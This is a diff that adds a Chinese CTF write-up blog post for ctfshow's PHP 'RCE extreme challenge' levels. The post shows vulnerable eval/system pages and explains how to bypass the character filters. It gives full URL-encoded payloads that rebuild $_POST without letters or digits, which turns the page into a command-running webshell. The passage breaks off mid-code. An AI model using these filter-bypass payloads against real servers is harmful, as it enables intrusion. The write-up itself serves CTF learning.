@@ -188,6 +188,275 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/23/%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="not coder">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/23/%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98/" class="post-title-link" itemprop="url">每周大挑战</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-23 13:19:13 / 修改时间：14:40:22" itemprop="dateCreated datePublished" datetime="2023-05-23T13:19:13+08:00">2023-05-23</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>ctfshow rce极限挑战</p>
+<p>不能用字母数字时，我们可以通过<strong>异或，取反，自增自减，或</strong>等位运算利用特殊字符构造出字母数字，再利用<strong>php动态函数名</strong>的特性来构造webshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;&#x27;.[];</span><br><span class="line">echo($a);//结果就为array</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">PHP在进行计算的时候认为结果是无限大时他会返回结果是:INF （ Infinite)</span><br><span class="line">这里举个列：echo (1/0);  //就会输出INF</span><br><span class="line">PHP进行计算的时候认为一个数超出Infinite，那就是: NAN( not-a-number)</span><br><span class="line">这里举个例：echo (a/a); //就会输出NAN</span><br></pre></td></tr></table></figure>
+
+<h2 id="rce1"><a href="#rce1" class="headerlink" title="rce1"></a>rce1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：echo <code>cat /f*</code>;</p>
+<h2 id="rce2"><a href="#rce2" class="headerlink" title="rce2"></a>rce2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>fuzz一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($a = 0; $a &lt; 256; $a++)&#123;</span><br><span class="line">    if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,chr($a)))&#123;</span><br><span class="line">        echo urlencode(chr($a)).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//! $ &#x27; ( ) + , . / ; = [ ] _</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">$__=&#x27;&#x27;;  //两个短杠赋值为空</span><br><span class="line">$_=$_[&#x27;&#x27;];//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span><br><span class="line">$_=++$_; //B</span><br><span class="line">$_=++$_; //C</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$__.=$_; //E  把两个短杠赋值为E</span><br><span class="line">$_=++$_; //F  一个短杠继续自增</span><br><span class="line">$_=++$_; //G </span><br><span class="line">$__=$_.$__; // GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span><br><span class="line">$_=++$_; //H 此处一个短杠继续自增，为H</span><br><span class="line">$_=++$_; //I</span><br><span class="line">$_=++$_; //J</span><br><span class="line">$_=++$_; //k</span><br><span class="line">$_=++$_; //L</span><br><span class="line">$_=++$_; //M</span><br><span class="line">$_=++$_; //N</span><br><span class="line">$_=++$_; //O</span><br><span class="line">$_=++$_; //P</span><br><span class="line">$_=++$_; //Q</span><br><span class="line">$_=++$_; //R</span><br><span class="line">$_=++$_; //S</span><br><span class="line">$_=++$_; //T</span><br><span class="line">$__.=$_; // GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span><br><span class="line">$&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__]); // 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>根据这个写的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//这是我这一题做出来的所用的</span><br><span class="line">$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ctf_show=%24_%3D%5B%5D.%5B%5D%3B%24__%3D%27%27%3B%24_%3D%24_%5B%27%27%5D%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__.%3D%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__%3D%24_.%24__%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__.%3D%24_%3B%24___%3D%27_%27%3B%24___.%3D%24__%3B%28%24%24___%5B_%5D%29%28%24%24___%5B__%5D%29%3B</span><br><span class="line">//然后get传_=system&amp;__=ls</span><br><span class="line">//url编码后用抓包传参，</span><br></pre></td></tr></table></figure>
+
+<p>ctfshow{6a98d4af-f123-458a-9ad8-4fbbbb75cdd6}</p>
+<h2 id="rce3"><a href="#rce3" class="headerlink" title="rce3"></a>rce3</h2><p>PHP进行计算的时候认为一个数超出Infinite，那就是: NAN( not-a-number)<br> 这里举个例：echo (a&#x2F;a); &#x2F;&#x2F;就会输出NAN</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//() + , . / 0 1 ; = [] _</span></span><br><span class="line">限制<span class="number">105</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=([].[])[0]; </span><br><span class="line">//这里就是上面的数组拼接，强制返回ArrayArray, 取第一个A</span><br><span class="line">$_=($_/$_.$_)[0]; </span><br><span class="line">//这里是关键php的计算上面有说，其实这里麻烦了，只是当时不知道, 这里返回 N</span><br><span class="line">$_++; //O</span><br><span class="line">$__=$_.$_++; </span><br><span class="line">//这里是进行了++的，所以$_等于P, $__=PO, 其实这里才是第五题的关键嘿嘿，很多74的就是卡在这</span><br><span class="line">$_++; // Q</span><br><span class="line">$_++; // R</span><br><span class="line">$_++; // S</span><br><span class="line">$_=_.$__.$_.++$_; //这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span><br><span class="line">$$_[_]($$_[1]); // $_POST[_]($_POST[1]);</span><br></pre></td></tr></table></figure>
+
+<p>因为N下面就有post的所有字母，而且比较近</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=%24_%3D%28%5B%5D.%5B%5D%29%5B0%5D%3B%24_%3D%28%24_/%24_.%24_%29%5B0%5D%3B%24_%2B%2B%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24__.%24_.%2B%2B%24_%3B%24%24_%5B_%5D%28%24%24_%5B1%5D%29%3B&amp;_=system&amp;1=ls</span><br></pre></td></tr></table></figure>
+
+<h2 id="rce4"><a href="#rce4" class="headerlink" title="rce4"></a>rce4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>比上一个少了1，而且字符数要求更少了。所以需要我们压缩得更短。不影响我们使用(0&#x2F;0)来构造NAN, 但是更为优秀的写法可以是<code>$a=(_/_._)[0];</code>直接得到字母N，payload构造过程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=(_/_._)[0];//直接拼接成字符串并切片</span><br><span class="line">$o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span><br><span class="line">$o=++$a.$o;//$o=&gt;PO,$a=&gt;P</span><br><span class="line">$a++;//Q</span><br><span class="line">$a++;//R</span><br><span class="line">$o.=++$a;//$o=&gt;POS,$a=&gt;S</span><br><span class="line">$o.=++$a;//$o=&gt;POST,$a=&gt;T</span><br><span class="line">$_=_.$o;//_POST</span><br><span class="line">$$_[0]($$_[_]);//$_POST[0]($_POST[_]);</span><br></pre></td></tr></table></figure>
+
+<p>这位师傅写的太棒了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>
+
+<h2 id="rce5"><a href="#rce5" class="headerlink" title="rce5"></a>rce5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>fuzz脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//      $()+,./;=[]_</span></span><br></pre></td></tr></table></figure>
+
+<p>​     phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=_(a/a)[a];//相当于gettext(0/0)[0],得到N</span><br><span class="line">$_=++$a;//O</span><br><span class="line">$_=_.++$a.$_;//_PO</span><br><span class="line">$a++;$a++;//R</span><br><span class="line">$_.=++$a.++$a;//_POST</span><br><span class="line">$$_[a]($$_[_]);//$_POST[a]($_POST[_])</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么<code>$_=$a.$a++;</code>这一步得到的是PO而不是OP，或者OO，而<code>$_=_.$a.$a++;</code>得到的是<code>_OO</code>,经过和用这种做法的师傅们讨论，目前分析下来最有可能的原因是，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，<code>$_=$a.$a++;//PO</code>这里相当于先执行了<code>$a++</code>操作（函数），并得到<code>$a++</code>的返回值，然后和左侧的<code>$a</code>变量进行拼接，此时<code>$a</code>已经是P了。而<code>$_=_.$a.$a++;</code>时先执行了<code>_</code>和<code>$a</code>的拼接，而后再执行<code>$_=&#39;_O&#39;.$a++</code>，所以得到的是<code>_OO</code>。*以上所有均为猜测，具体机制需研究PHP源码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure>
+
+<p>注意不可见字符要抓包传参，空格换成+号</p>
+<p>68位</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//巧妙的把两次$_++放在一起</span></span><br><span class="line"><span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span><span class="comment">//$a直接拼接出_POST</span></span><br><span class="line"><span class="variable">$$a</span>[_POST](<span class="variable">$$a</span>[_])<span class="comment">//$_POST[_POST]($_POST[_])</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">CTFshow-RCE极限大挑战官方wp - 飞书云文档 (feishu.cn)</a></p>
+<p>这位师傅写的好棒</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61955196/article/details/127932968">https://blog.csdn.net/qq_61955196/article/details/127932968</a></p>
+<h2 id="极限命令执行1"><a href="#极限命令执行1" class="headerlink" title="极限命令执行1"></a>极限命令执行1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里，或者直接运行根目录getflag</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;,$ctfshow))&#123;</span><br><span class="line">            system($ctfshow);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo(&quot;????????&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>fuzz一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)) . <span class="string">&quot; &quot;</span>;</span><br><span class="line">    